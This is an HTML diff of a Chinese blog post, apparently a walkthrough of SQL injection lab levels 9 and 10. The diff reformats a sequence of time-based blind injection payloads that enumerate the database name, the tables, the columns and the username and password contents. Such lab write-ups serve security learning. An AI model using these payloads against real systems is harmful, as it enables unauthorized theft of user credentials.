@@ -271,9 +271,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-03-21 23:11:07 / 修改时间：23:29:28" itemprop="dateCreated datePublished" datetime="2023-03-21T23:11:07+08:00">2023-03-21</time>
+      <time title="创建时间：2023-03-21 23:11:07" itemprop="dateCreated datePublished" datetime="2023-03-21T23:11:07+08:00">2023-03-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-22 00:24:57" itemprop="dateModified" datetime="2023-03-22T00:24:57+08:00">2023-03-22</time>
     </span>
 
   
@@ -286,12 +292,12 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>输入数值发现页面不回显，使用时间注入函数。<br><img src="/images/sql9-10/1.png"><br>**?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+**，验证时间注入<br>2.判断数据库的长度，得到数据库的长度为8<br><strong>?id&#x3D;1’and if(length((select database()))&#x3D;8,sleep(5),1)–+</strong><br>3.判断数据库名字，115为s的ASCII值，依次判断<br><strong>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+</strong><br>4.判断所有表名长度<br><strong>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+</strong></p>
-<p>4.逐一判断表名<br><strong>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&#x3D;99,sleep(5),1)–+</strong></p>
-<p>5.判断所有字段名的长度<br><strong>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+</strong></p>
-<p>6.逐一判断字段名<br><strong>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+</strong></p>
-<p>7.判断字段内容长度<br><strong>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+</strong></p>
-<p>8.逐一查找内容<br><strong>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+</strong></p>
+          <p>输入数值发现页面不回显，使用时间注入函数。<br><img src="/images/sql9-10/1.png"><br><code>?id=1&#39; and if(1=1,sleep(5),1)--+</code>，验证时间注入<br>2.判断数据库的长度，得到数据库的长度为8<br><code>?id=1&#39;and if(length((select database()))=8,sleep(5),1)--+</code><br>3.判断数据库名字，115为s的ASCII值，依次判断<br><code>?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</code><br>4.判断所有表名长度<br><code>?id=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</code></p>
+<p>4.逐一判断表名<br><code>?id=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=99,sleep(5),1)--+</code></p>
+<p>5.判断所有字段名的长度<br><code>?id=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+</code></p>
+<p>6.逐一判断字段名<br><code>?id=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+</code></p>
+<p>7.判断字段内容长度<br><code>?id=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</code></p>
+<p>8.逐一查找内容<br><code>?id=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</code></p>
 <p>第十关<br>第十关就是闭合变成双引号了 ，其他是一样的.</p>
 
       
